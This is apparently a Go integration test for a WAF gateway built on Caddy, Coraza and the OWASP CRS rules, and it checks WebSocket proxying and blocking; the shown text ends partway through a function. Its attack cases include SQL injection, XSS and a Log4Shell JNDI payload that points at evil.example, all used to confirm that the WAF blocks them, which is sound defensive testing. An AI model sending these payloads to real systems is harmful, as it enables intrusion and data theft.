// caddy_websocket_integration_test.go WebSocket（ws:// / wss://）真实 Caddy 全链路集成测试：
// in-process Caddy v2.11.4 + coraza-caddy v2.6.0 + 真实 OWASP CRS（../../rules）+
// jiuzhang_guard（accesslog / API 动态防护 / Bot PROTECT）+ headers(deferred:true) +
// reverse_proxy（另覆 jiuzhang_software_bypass 与 jiuzhang_tls_mux 监听路径及静态 Caddyfile 链序校验）。
package jiuzhang_guard

import (
	"bufio"
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/caddyserver/caddy/v2"
	"github.com/caddyserver/caddy/v2/caddyconfig/caddyfile"
	"github.com/caddyserver/caddy/v2/caddyconfig/httpcaddyfile"
	_ "github.com/caddyserver/caddy/v2/modules/standard"
	_ "github.com/corazawaf/coraza-caddy/v2"
	"github.com/jiuzhang-waf/gateway/dynamic_security/classifier"
	"github.com/jiuzhang-waf/gateway/modules/jiuzhang_guard/apievents"
	"github.com/jiuzhang-waf/gateway/modules/jiuzhang_guard/events"
	"github.com/jiuzhang-waf/gateway/modules/jiuzhang_guard/ratelimit"
	"github.com/jiuzhang-waf/gateway/modules/jiuzhang_guard/temporaryblock"
)

const wsGUID = "258EAFA5-E914-47CF-95CA-C5AB0DC85B11"

func wsAcceptKey(secKey string) string {
	h := sha1.New()
	_, _ = io.WriteString(h, strings.TrimSpace(secKey)+wsGUID)
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// writeWSFrame 写入 RFC 6455 帧（client->server 带 4 字节掩码，server->client 不加掩码）。
func writeWSFrame(w io.Writer, opcode byte, payload []byte, masked bool) error {
	var hdr [14]byte
	hdr[0] = 0x80 | (opcode & 0x0f) // FIN=1
	n := len(payload)
	idx := 2
	maskBit := byte(0)
	if masked {
		maskBit = 0x80
	}
	switch {
	case n < 126:
		hdr[1] = maskBit | byte(n)
	case n <= 0xffff:
		hdr[1] = maskBit | 126
		binary.BigEndian.PutUint16(hdr[2:4], uint16(n))
		idx = 4
	default:
		return fmt.Errorf("test ws payload too large: %d", n)
	}
	var mask [4]byte
	if masked {
		if _, err := io.ReadFull(rand.Reader, mask[:]); err != nil {
			return err
		}
		copy(hdr[idx:idx+4], mask[:])
		idx += 4
	}
	if _, err := w.Write(hdr[:idx]); err != nil {
		return err
	}
	if n == 0 {
		return nil
	}
	if !masked {
		_, err := w.Write(payload)
		return err
	}
	buf := make([]byte, n)
	for i := 0; i < n; i++ {
		buf[i] = payload[i] ^ mask[i%4]
	}
	_, err := w.Write(buf)
	return err
}

// readWSFrame 读取单帧 RFC 6455 报文并返回 (opcode, payload)。
func readWSFrame(r io.Reader) (byte, []byte, error) {
	var b [2]byte
	if _, err := io.ReadFull(r, b[:]); err != nil {
		return 0, nil, err
	}
	opcode := b[0] & 0x0f
	masked := (b[1] & 0x80) != 0
	length := int(b[1] & 0x7f)
	if length == 126 {
		var ext [2]byte
		if _, err := io.ReadFull(r, ext[:]); err != nil {
			return 0, nil, err
		}
		length = int(binary.BigEndian.Uint16(ext[:]))
	} else if length == 127 {
		return 0, nil, fmt.Errorf("unexpected 64-bit ws frame length in test")
	}
	var mask [4]byte
	if masked {
		if _, err := io.ReadFull(r, mask[:]); err != nil {
			return 0, nil, err
		}
	}
	payload := make([]byte, length)
	if length > 0 {
		if _, err := io.ReadFull(r, payload); err != nil {
			return 0, nil, err
		}
		if masked {
			for i := 0; i < length; i++ {
				payload[i] ^= mask[i%4]
			}
		}
	}
	return opcode, payload, nil
}

// newWSEchoOrigin 启动真实 RFC 6455 WebSocket 回显源站：
//   - 响应头附带 Server: TestOrigin/1.0，便于断言 deferred headers 仍剥离版本头；
//   - 路径 /ws/text-ct 额外附带 Content-Type: text/plain，用于回归验证 coraza-caddy v2.6.0
//     hijackerTracker 在命中 SecResponseBodyMimeType 时跳过劫持后 Phase 4 处理。
func newWSEchoOrigin(t *testing.T) (*httptest.Server, *atomic.Int64) {
	t.Helper()
	var hits atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		key := r.Header.Get("Sec-WebSocket-Key")
		if key == "" || !strings.EqualFold(r.Header.Get("Upgrade"), "websocket") {
			w.WriteHeader(http.StatusBadRequest)
			_, _ = io.WriteString(w, "missing websocket upgrade headers")
			return
		}
		w.Header().Set("Server", "TestOrigin/1.0")
		w.Header().Set("Upgrade", "websocket")
		w.Header().Set("Connection", "Upgrade")
		w.Header().Set("Sec-WebSocket-Accept", wsAcceptKey(key))
		if r.URL.Path == "/api/v1/ws/text-ct" {
			w.Header().Set("Content-Type", "text/plain")
		}
		w.WriteHeader(http.StatusSwitchingProtocols)
		conn, brw, err := http.NewResponseController(w).Hijack()
		if err != nil {
			return
		}
		defer conn.Close()
		_ = brw.Flush()
		_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
		for {
			op, data, err := readWSFrame(brw)
			if err != nil {
				return
			}
			switch op {
			case 0x1, 0x2:
				if err := writeWSFrame(brw, op, append([]byte("echo:"), data...), false); err != nil {
					return
				}
				if err := brw.Flush(); err != nil {
					return
				}
			case 0x8:
				_ = writeWSFrame(brw, 0x8, nil, false)
				_ = brw.Flush()
				return
			case 0x9:
				_ = writeWSFrame(brw, 0xA, data, false)
				_ = brw.Flush()
			}
		}
	}))
	t.Cleanup(srv.Close)
	return srv, &hits
}

// wsDialResult 封装原始 WebSocket 握手响应与可选升级后的连接。
type wsDialResult struct {
	resp      *http.Response
	acceptExp string
	conn      net.Conn
	br        *bufio.Reader
}

func (r *wsDialResult) close() {
	if r != nil && r.conn != nil {
		_ = r.conn.Close()
	}
}

func dialWebSocket(t *testing.T, addr string, useTLS bool, path string, extraHeaders map[string]string) *wsDialResult {
	t.Helper()
	var (
		conn net.Conn
		err  error
	)
	if useTLS {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", addr, &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         "localhost",
			NextProtos:         []string{"http/1.1"},
		})
	} else {
		conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
	}
	if err != nil {
		t.Fatalf("dial %s (tls=%v): %v", addr, useTLS, err)
	}
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	secKey := "dGhlIHNhbXBsZSBub25jZQ=="
	var reqBuf bytes.Buffer
	fmt.Fprintf(&reqBuf, "GET %s HTTP/1.1\r\n", path)
	fmt.Fprintf(&reqBuf, "Host: localhost\r\n")
	fmt.Fprintf(&reqBuf, "Upgrade: websocket\r\n")
	fmt.Fprintf(&reqBuf, "Connection: Upgrade\r\n")
	fmt.Fprintf(&reqBuf, "Sec-WebSocket-Key: %s\r\n", secKey)
	fmt.Fprintf(&reqBuf, "Sec-WebSocket-Version: 13\r\n")
	for k, v := range extraHeaders {
		fmt.Fprintf(&reqBuf, "%s: %s\r\n", k, v)
	}
	reqBuf.WriteString("\r\n")
	if _, err := conn.Write(reqBuf.Bytes()); err != nil {
		_ = conn.Close()
		t.Fatalf("write ws handshake: %v", err)
	}

	br := bufio.NewReader(conn)
	dummyReq, _ := http.NewRequest(http.MethodGet, "http://localhost"+path, nil)
	resp, err := http.ReadResponse(br, dummyReq)
	if err != nil {
		_ = conn.Close()
		t.Fatalf("read ws handshake response (%s tls=%v): %v", path, useTLS, err)
	}
	return &wsDialResult{
		resp:      resp,
		acceptExp: wsAcceptKey(secKey),
		conn:      conn,
		br:        br,
	}
}

func assertWSEchoAndClose(t *testing.T, res *wsDialResult, msgs ...string) {
	t.Helper()
	if res.resp.StatusCode != http.StatusSwitchingProtocols {
		body, _ := io.ReadAll(res.resp.Body)
		t.Fatalf("status = %d, want 101; headers=%v body=%q", res.resp.StatusCode, res.resp.Header, string(body))
	}
	if !strings.EqualFold(res.resp.Header.Get("Upgrade"), "websocket") {
		t.Fatalf("Upgrade header = %q, want websocket", res.resp.Header.Get("Upgrade"))
	}
	if got := res.resp.Header.Get("Sec-WebSocket-Accept"); got != res.acceptExp {
		t.Fatalf("Sec-WebSocket-Accept = %q, want %q", got, res.acceptExp)
	}
	if srv := res.resp.Header.Get("Server"); srv != "" {
		t.Fatalf("Server header leaked on 101 response: %q", srv)
	}
	for _, msg := range msgs {
		if err := writeWSFrame(res.conn, 0x1, []byte(msg), true); err != nil {
			t.Fatalf("write ws text frame %q: %v", msg, err)
		}
		op, got, err := readWSFrame(res.br)
		if err != nil {
			t.Fatalf("read ws echo for %q: %v", msg, err)
		}
		if op != 0x1 || string(got) != "echo:"+msg {
			t.Fatalf("echo frame = (op=%d, %q), want (1, %q)", op, string(got), "echo:"+msg)
		}
	}
	// 发送 RFC 6455 Close 控制帧并等待服务端回 Close，确保 reverse_proxy 与 coraza responseProcessor 完整收尾
	_ = writeWSFrame(res.conn, 0x8, nil, true)
	_, _, _ = readWSFrame(res.br)
	res.close()
}

func wsSelfSignedCertPEM(t *testing.T) (certPEM, keyPEM string) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "localhost"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		DNSNames:              []string{"localhost"},
		IPAddresses:           []net.IP{net.ParseIP("127.0.0.1")},
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		t.Fatal(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})),
		string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}))
}

func buildRealCRSDirectives(t *testing.T, ruleEngine, dir, auditLogPath string) string {
	t.Helper()
	rules, err := filepath.Abs("../../rules")
	if err != nil {
		t.Fatal(err)
	}
	return strings.Join([]string{
		"SecRuleEngine " + ruleEngine,
		"Include " + filepath.Join(rules, "coraza.conf"),
		"SecDataDir " + filepath.Join(dir, "coraza-data"),
		"SecAuditEngine RelevantOnly",
		"SecAuditLogParts ABIJDEFHZ",
		"SecAuditLog " + auditLogPath,
		"Include " + filepath.Join(rules, "crs/crs-setup.conf"),
		"Include " + filepath.Join(rules, "exclusions/before-crs.conf"),
		"Include " + filepath.Join(rules, "crs/rules/*.conf"),
		"Include " + filepath.Join(rules, "contrib/*/*.conf"),
		"Include " + filepath.Join(rules, "exclusions/after-crs.conf"),
		"Include " + filepath.Join(rules, "jiuzhang/jiuzhang-custom.conf"),
		"Include " + filepath.Join(rules, "jiuzhang/post-contrib-blocking.conf"),
	}, "\n") + "\n"
}

func installFakeSharedEngineForBot(t *testing.T) {
	t.Helper()
	resetSharedEngineForTest()
	t.Cleanup(resetSharedEngineForTest)
	sig := engineFingerprint(&Guard{CounterBackend: "memory"})
	engineMu.Lock()
	engineInst = &sharedEngine{
		initialized: true,
		sig:         sig,
		valkey:      newFakeGuardValkey(),
		limiter:     ratelimit.NewMemoryLimiter(10000),
		blockCache:  temporaryblock.NewCache(nil, 0),
		lastErrEmit: map[string]time.Time{},
	}
	engineMu.Unlock()
}

func wsErrorRoutes() map[string]interface{} {
	return map[string]interface{}{
		"routes": []interface{}{
			map[string]interface{}{
				"handle": []interface{}{
					map[string]interface{}{
						"handler":     "static_response",
						"status_code": "{http.error.status_code}",
						"body":        "{http.error.status_code} {http.error.status_text}",
					},
				},
			},
		},
	}
}

func wsDeferredHeaderHandler() map[string]interface{} {
	return map[string]interface{}{
		"handler": "headers",
		"response": map[string]interface{}{
			"set": map[string][]string{
				"X-Content-Type-Options": {"nosniff"},
				"X-Frame-Options":        {"DENY"},
				"Referrer-Policy":        {"no-referrer"},
			},
			"delete":   []string{"Server", "Via", "X-Powered-By"},
			"deferred": true,
		},
	}
}

func wsRequestIDHandler() map[string]interface{} {
	return map[string]interface{}{
		"handler": "headers",
		"request": map[string]interface{}{
			"set":    map[string][]string{"X-Request-Id": {"{http.request.uuid}"}},
			"delete": []string{},
		},
		"response": map[string]interface{}{
			"set": map[string][]string{"X-Jiuzhang-Request-ID": {"{http.request.header.X-Request-Id}"}},
		},
	}
}

func waitForJSONLMatch[T any](t *testing.T, path string, match func(T) bool) T {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	var lastLines []string
	for time.Now().Before(deadline) {
		raw, err := os.ReadFile(path)
		if err == nil {
			lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
			lastLines = lines
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				var item T
				if err := json.Unmarshal([]byte(line), &item); err == nil && match(item) {
					return item
				}
			}
		}
		time.Sleep(25 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for matching JSONL record in %s (saw %d lines): %v", path, len(lastLines), lastLines)
	var zero T
	return zero
}

func startInProcessCaddy(t *testing.T, cfg map[string]interface{}) {
	t.Helper()
	prevAutosave := caddy.ConfigAutosavePath
	caddy.ConfigAutosavePath = ""
	t.Cleanup(func() {
		_ = caddy.Stop()
		caddy.ConfigAutosavePath = prevAutosave
	})
	raw, err := json.Marshal(cfg)
	if err != nil {
		t.Fatalf("marshal caddy config: %v", err)
	}
	if err := caddy.Load(raw, true); err != nil {
		t.Fatalf("caddy.Load failed: %v", err)
	}
}

// TestCaddyWebSocket_ModesAndSecurity 覆盖生产同序链（requestID → jiuzhang_guard → waf(coraza-caddy v2.6.0 + 真实 CRS) →
// headers(deferred:true) → reverse_proxy）下 ws:// 与 wss:// 在 PROTECT / OBSERVE / OFF / BYPASS 四种模式的完整行为。
func TestCaddyWebSocket_ModesAndSecurity(t *testing.T) {
	origin, originHits := newWSEchoOrigin(t)
	upstreamAddr := strings.TrimPrefix(origin.URL, "http://")
	certPEM, keyPEM := wsSelfSignedCertPEM(t)

	type modeCase struct {
		name       string
		mode       string // PROTECT | OBSERVE | OFF | BYPASS
		ruleEngine string // On | DetectionOnly | Off
		withBot    bool
	}
	cases := []modeCase{
		{name: "PROTECT", mode: "PROTECT", ruleEngine: "On", withBot: true},
		{name: "OBSERVE", mode: "OBSERVE", ruleEngine: "DetectionOnly"},
		{name: "OFF", mode: "OFF", ruleEngine: "Off"},
		{name: "BYPASS", mode: "BYPASS"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			if tc.withBot {
				installFakeSharedEngineForBot(t)
			}
			httpAddr := freeTCPAddress(t)
			httpsAddr := freeTCPAddress(t)

			eventsLog := filepath.Join(dir, "events.log")
			apiLog := filepath.Join(dir, "api-runtime-events.log")
			accessLog := filepath.Join(dir, "access-full.jsonl")
			auditLog := filepath.Join(dir, "coraza-audit.log")

			var handles []interface{}
			handles = append(handles, wsRequestIDHandler())
			if tc.mode != "BYPASS" {
				guard := map[string]interface{}{
					"handler":                "jiuzhang_guard",
					"app_id":                 "app-ws-e2e",
					"app_code":               "wse2e",
					"counter_backend":        "memory",
					"fail_open":              true,
					"events_log":             eventsLog,
					"gateway_node":           "ws-e2e-node",
					"identity_salt":          "ws-e2e-salt",
					"api_dynamic_protection": true,
					"api_protection_mode":    "OBSERVE",
					"api_events_log":         apiLog,
					"access_log": map[string]interface{}{
						"enabled":                  true,
						"capture_request_headers":  true,
						"capture_response_headers": true,
						"log_path":                 accessLog,
					},
				}
				if tc.withBot {
					botPolicy := map[string]interface{}{
						"schema_version": 1,
						"application_id": "app-ws-e2e",
						"mode":           "PROTECT",
						"version":        1,
						"selectors":      []map[string]string{{"path_prefix": "/api/v1/ws"}},
						"signal_rules": map[string]interface{}{
							"min_independent_groups": 2,
							"require_behavior_group": true,
							"rules": []map[string]interface{}{
								{
									"id": "ua_bot", "group": "client_claim", "metric": "ua_class_match",
									"params": map[string]string{"class": "BOT"}, "window_seconds": 300, "weight": 1,
								},
								{
									"id": "uc", "group": "request_behavior", "metric": "uri_concentration",
									"window_seconds": 300, "weight": 1, "threshold": 0.5,
								},
							},
						},
						"challenge": map[string]interface{}{
							"type": "JS", "nonce_ttl_seconds": 90, "clearance_ttl_seconds": 900,
							"difficulty": 10, "max_attempts": 3, "key_ref": "ws-bot-key",
						},
						"route_reservation": map[string]string{"state": "ENABLED", "namespace": "/_wdsp/bot/v1/"},
						"signing_keys": map[string]string{
							"ws-bot-key": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
						},
					}
					guard["bot_policy"] = botPolicy
				}
				handles = append(handles, guard)
				handles = append(handles, map[string]interface{}{
					"handler":    "waf",
					"directives": buildRealCRSDirectives(t, tc.ruleEngine, dir, auditLog),
				})
			}
			handles = append(handles, wsDeferredHeaderHandler())
			handles = append(handles, map[string]interface{}{
				"handler":   "reverse_proxy",
				"upstreams": []map[string]string{{"dial": upstreamAddr}},
			})

			cfg := map[string]interface{}{
				"admin":   map[string]interface{}{"disabled": true},
				"storage": map[string]interface{}{"module": "file_system", "root": filepath.Join(dir, "storage")},
				"apps": map[string]interface{}{
					"tls": map[string]interface{}{
						"certificates": map[string]interface{}{
							"load_pem": []map[string]interface{}{
								{"certificate": certPEM, "key": keyPEM, "tags": []string{"ws-e2e"}},
							},
						},
					},
					"http": map[string]interface{}{
						"servers": map[string]interface{}{
							"srv_http": map[string]interface{}{
								"listen":          []string{httpAddr},
								"automatic_https": map[string]interface{}{"disable": true},
								"errors":          wsErrorRoutes(),
								"routes":          []interface{}{map[string]interface{}{"handle": handles}},
							},
							"srv_https": map[string]interface{}{
								"listen":          []string{httpsAddr},
								"automatic_https": map[string]interface{}{"disable": true},
								"tls_connection_policies": []interface{}{
									map[string]interface{}{
										"certificate_selection": map[string]interface{}{"any_tag": []string{"ws-e2e"}},
									},
								},
								"errors": wsErrorRoutes(),
								"routes": []interface{}{map[string]interface{}{"handle": handles}},
							},
						},
					},
				},
			}
			startInProcessCaddy(t, cfg)

			// 1. 正常 ws:// 与 wss:// 101 握手 + 双向回显 + 版本头剥离
			for _, scheme := range []struct {
				label  string
				addr   string
				useTLS bool
			}{
				{label: "ws", addr: httpAddr, useTLS: false},
				{label: "wss", addr: httpsAddr, useTLS: true},
			} {
				path := "/api/v1/ws/echo-" + scheme.label
				extra := map[string]string{}
				if tc.withBot && scheme.useTLS {
					// 携带 Bot 特征 UA + 导航头测试 Bot PROTECT 跳过升级请求（INELIGIBLE_UPGRADE）
					extra["User-Agent"] = "curl/8.1"
					extra["Accept"] = "text/html"
					extra["Sec-Fetch-Dest"] = "document"
					extra["Sec-Fetch-Mode"] = "navigate"
				}
				res := dialWebSocket(t, scheme.addr, scheme.useTLS, path, extra)
				assertWSEchoAndClose(t, res, "hello-"+tc.name+"-"+scheme.label, "second-frame")

				if tc.mode != "BYPASS" {
					al := waitForJSONLMatch(t, accessLog, func(rec accessLogRecord) bool {
						return rec.Path == path
					})
					if al.ResponseStatus != http.StatusSwitchingProtocols {
						t.Fatalf("%s/%s accesslog response_status = %d, want 101", tc.name, scheme.label, al.ResponseStatus)
					}
					if al.WAFAction != wafActionAllow && al.WAFAction != wafActionObserve {
						t.Fatalf("%s/%s accesslog waf_action = %q, want ALLOW or OBSERVE", tc.name, scheme.label, al.WAFAction)
					}
					apiEv := waitForJSONLMatch(t, apiLog, func(rec apievents.Record) bool {
						return rec.RawPath == path
					})
					if apiEv.Protocol != classifier.ProtocolWebsocketHandshake {
						t.Fatalf("%s/%s api event protocol = %q, want %s", tc.name, scheme.label, apiEv.Protocol, classifier.ProtocolWebsocketHandshake)
					}
				}
			}

			// 2. PROTECT 专项：上游 101 附带 Content-Type: text/plain（命中 SecResponseBodyMimeType）
			//    验证 hijackerTracker 跳过劫持后 Phase 4，不触发 500 或劫持后写头异常；
			//    同时验证 Bot PROTECT 记录了 INELIGIBLE_UPGRADE 观测事件。
			if tc.mode == "PROTECT" {
				ctRes := dialWebSocket(t, httpsAddr, true, "/api/v1/ws/text-ct", nil)
				assertWSEchoAndClose(t, ctRes, "text-ct-101-ok")

				ctAL := waitForJSONLMatch(t, accessLog, func(rec accessLogRecord) bool {
					return rec.Path == "/api/v1/ws/text-ct"
				})
				if ctAL.ResponseStatus != http.StatusSwitchingProtocols {
					t.Fatalf("text-ct 101 accesslog status = %d, want 101", ctAL.ResponseStatus)
				}

				botEv := waitForJSONLMatch(t, eventsLog, func(ev events.Event) bool {
					return ev.EventType == events.BotChallengeOffered && ev.Bot != nil && ev.Bot.Reason == "INELIGIBLE_UPGRADE"
				})
				if botEv.Action != "OBSERVE" {
					t.Fatalf("bot INELIGIBLE_UPGRADE action = %q, want OBSERVE", botEv.Action)
				}
			}

			// 3. 恶意 WebSocket 握手（CRS PL1：URI SQLi / URI XSS / Cookie 头 SQLi / User-Agent 头 JNDI）
			attackCases := []struct {
				label string
				path  string
				hdrs  map[string]string
			}{
				{label: "sqli-uri", path: "/api/v1/ws/attack-sqli?id=1%27+OR+1%3D1--"},
				{label: "xss-uri", path: "/api/v1/ws/attack-xss?q=%3Cscript%3Ealert(1)%3C/script%3E"},
				{label: "cookie-sqli", path: "/api/v1/ws/attack-cookie", hdrs: map[string]string{"Cookie": "session=1' UNION SELECT username,password FROM users--"}},
				{label: "header-jndi", path: "/api/v1/ws/attack-jndi", hdrs: map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}},
			}
			for _, ac := range attackCases {
				hitsBefore := originHits.Load()
				res := dialWebSocket(t, httpsAddr, true, ac.path, ac.hdrs)
				if tc.mode == "PROTECT" {
					if res.resp.StatusCode != http.StatusForbidden {
						body, _ := io.ReadAll(res.resp.Body)
						res.close()
						t.Fatalf("PROTECT %s status = %d, want 403; body=%q", ac.label, res.resp.StatusCode, string(body))
					}
					res.close()
					if got := originHits.Load(); got != hitsBefore {
						t.Fatalf("PROTECT %s reached origin: hits %d -> %d", ac.label, hitsBefore, got)
					}
					al := waitForJSONLMatch(t, accessLog, func(rec accessLogRecord) bool {
						return strings.HasPrefix(rec.Path, strings.SplitN(ac.path, "?", 2)[0])
					})
					if al.ResponseStatus != http.StatusForbidden || al.WAFAction != wafActionBlock {
						t.Fatalf("PROTECT %s accesslog = (status=%d, action=%q), want (403, BLOCK)", ac.label, al.ResponseStatus, al.WAFAction)
					}
					apiEv := waitForJSONLMatch(t, apiLog, func(rec apievents.Record) bool {
						return rec.RawPath == strings.SplitN(ac.path, "?", 2)[0]
					})
					if apiEv.FinalAction != "BLOCK" {
						t.Fatalf("PROTECT %s api final_action = %q, want BLOCK", ac.label, apiEv.FinalAction)
					}
					foundWAF := false
					for _, d := range apiEv.Details {
						if d.Detector == "waf" && d.RuleID == "waf.downstream_intercept" {
							foundWAF = true
							break
						}
					}
					if !foundWAF {
						t.Fatalf("PROTECT %s missing waf.downstream_intercept attribution: %+v", ac.label, apiEv.Details)
					}
				} else {
					assertWSEchoAndClose(t, res, "allowed-"+tc.name+"-"+ac.label)
				}
			}

			// OBSERVE 模式断言审计日志确有命中落盘（非空）
			if tc.mode == "OBSERVE" {
				deadline := time.Now().Add(3 * time.Second)
				audited := false
				for time.Now().Before(deadline) {
					if data, err := os.ReadFile(auditLog); err == nil && len(bytes.TrimSpace(data)) > 0 {
						audited = true
						break
					}
					time.Sleep(25 * time.Millisecond)
				}
				if !audited {
					t.Fatalf("OBSERVE mode expected Coraza audit log entries in %s", auditLog)
				}
			}
		})
	}
}

// TestCaddyWebSocket_SoftwareBypassAndTLSMux 验证经 jiuzhang_tls_mux（国际 TLS + ALPN h2/http1.1）
// 与 jiuzhang_software_bypass（正常检测子链 + 共享 reverse_proxy）的 wss:// 101 升级与防护拦截。
func TestCaddyWebSocket_SoftwareBypassAndTLSMux(t *testing.T) {
	origin, originHits := newWSEchoOrigin(t)
	upstreamAddr := strings.TrimPrefix(origin.URL, "http://")
	certPEM, keyPEM := wsSelfSignedCertPEM(t)
	dir := t.TempDir()
	httpsAddr := freeTCPAddress(t)
	accessLog := filepath.Join(dir, "access-full.jsonl")
	auditLog := filepath.Join(dir, "coraza-audit.log")

	guard := map[string]interface{}{
		"handler":         "jiuzhang_guard",
		"app_id":          "app-ws-mux",
		"app_code":        "wsmux",
		"counter_backend": "memory",
		"fail_open":       true,
		"events_log":      filepath.Join(dir, "events.log"),
		"gateway_node":    "ws-mux-node",
		"access_log": map[string]interface{}{
			"enabled":  true,
			"log_path": accessLog,
		},
	}
	waf := map[string]interface{}{
		"handler":    "waf",
		"directives": buildRealCRSDirectives(t, "On", dir, auditLog),
	}
	normalHandles := []interface{}{wsRequestIDHandler(), guard, waf, wsDeferredHeaderHandler()}
	bypassHandles := []interface{}{wsRequestIDHandler(), wsDeferredHeaderHandler()}

	selector := map[string]interface{}{
		"handler":                  "jiuzhang_software_bypass",
		"app_id":                   "app-ws-mux",
		"node":                     "ws-mux-node",
		"enabled":                  false, // 正常路径执行 normal 子链（含 guard + waf + deferred headers）
		"cpu_threshold_percent":    95,
		"memory_threshold_percent": 95,
		"min_hold_seconds":         30,
		"normal":                   map[string]interface{}{"routes": []interface{}{map[string]interface{}{"handle": normalHandles}}},
		"bypass":                   map[string]interface{}{"routes": []interface{}{map[string]interface{}{"handle": bypassHandles}}},
	}

	cfg := map[string]interface{}{
		"admin":   map[string]interface{}{"disabled": true},
		"storage": map[string]interface{}{"module": "file_system", "root": filepath.Join(dir, "storage")},
		"apps": map[string]interface{}{
			"http": map[string]interface{}{
				"servers": map[string]interface{}{
					"srv_mux": map[string]interface{}{
						"listen":          []string{httpsAddr},
						"automatic_https": map[string]interface{}{"disable": true},
						"protocols":       []string{"h1", "h2"},
						"listener_wrappers": []interface{}{
							map[string]interface{}{
								"wrapper":      "jiuzhang_tls_mux",
								"gateway_node": "ws-mux-node",
								"sites": []interface{}{
									map[string]interface{}{
										"app_id":                   "app-ws-mux",
										"domains":                  []string{"localhost"},
										"tls_protocol_mode":        "AUTO_DETECT",
										"allowed_tls_versions":     []string{"TLS1.2", "TLS1.3"},
										"http_versions":            []string{"HTTP/1.1", "HTTP/2"},
										"session_analysis_enabled": false,
										"cert_pem":                 certPEM,
										"key_pem":                  keyPEM,
									},
								},
							},
						},
						"errors": wsErrorRoutes(),
						"routes": []interface{}{
							map[string]interface{}{
								"handle": []interface{}{
									selector,
									map[string]interface{}{
										"handler":   "reverse_proxy",
										"upstreams": []map[string]string{{"dial": upstreamAddr}},
									},
								},
							},
						},
					},
				},
			},
		},
	}
	startInProcessCaddy(t, cfg)

	// 正常 wss:// 经 jiuzhang_tls_mux + jiuzhang_software_bypass(normal) → 101 + 双向回显
	res := dialWebSocket(t, httpsAddr, true, "/ws/mux-ok", nil)
	assertWSEchoAndClose(t, res, "hello-tlsmux-sb")

	al := waitForJSONLMatch(t, accessLog, func(rec accessLogRecord) bool {
		return rec.Path == "/ws/mux-ok"
	})
	if al.ResponseStatus != http.StatusSwitchingProtocols {
		t.Fatalf("tlsmux+software_bypass accesslog status = %d, want 101", al.ResponseStatus)
	}

	// 恶意 wss:// 握手经同一链路被 WAF 403 拦截且不到达源站
	hitsBefore := originHits.Load()
	atk := dialWebSocket(t, httpsAddr, true, "/ws/mux-atk?id=1%27+OR+1%3D1--", nil)
	if atk.resp.StatusCode != http.StatusForbidden {
		atk.close()
		t.Fatalf("tlsmux+software_bypass attack status = %d, want 403", atk.resp.StatusCode)
	}
	atk.close()
	if got := originHits.Load(); got != hitsBefore {
		t.Fatalf("attack reached origin through tlsmux+software_bypass: %d -> %d", hitsBefore, got)
	}
}

// TestStaticCaddyfile_WebSocketHandlerOrder 验证静态 gateway/configs/Caddyfile 经 Caddyfile 适配器
// 编译后的处理器顺序严格满足 request_header → waf → header(deferred:true) → reverse_proxy，
// 防止未来回归把 deferred ResponseWriterWrapper 重新排到 coraza_waf 前方破坏 WebSocket 101 Hijack。
func TestStaticCaddyfile_WebSocketHandlerOrder(t *testing.T) {
	raw, err := os.ReadFile("../../configs/Caddyfile")
	if err != nil {
		t.Fatalf("read gateway/configs/Caddyfile: %v", err)
	}
	adapter := caddyfile.Adapter{ServerType: httpcaddyfile.ServerType{}}
	adapted, _, err := adapter.Adapt(raw, map[string]any{"filename": "Caddyfile"})
	if err != nil {
		t.Fatalf("adapt gateway/configs/Caddyfile: %v", err)
	}

	var parsed struct {
		Apps struct {
			HTTP struct {
				Servers map[string]struct {
					Routes []json.RawMessage `json:"routes"`
				} `json:"servers"`
			} `json:"http"`
		} `json:"apps"`
	}
	if err := json.Unmarshal(adapted, &parsed); err != nil {
		t.Fatalf("unmarshal adapted JSON: %v", err)
	}

	var ordered []map[string]any
	var collect func(routes []json.RawMessage)
	collect = func(routes []json.RawMessage) {
		for _, rRaw := range routes {
			var r struct {
				Handle []json.RawMessage `json:"handle"`
			}
			if err := json.Unmarshal(rRaw, &r); err != nil {
				continue
			}
			for _, hRaw := range r.Handle {
				var h map[string]any
				if err := json.Unmarshal(hRaw, &h); err != nil {
					continue
				}
				if h["handler"] == "subroute" {
					var sub struct {
						Routes []json.RawMessage `json:"routes"`
					}
					if err := json.Unmarshal(hRaw, &sub); err == nil {
						collect(sub.Routes)
					}
					continue
				}
				ordered = append(ordered, h)
			}
		}
	}
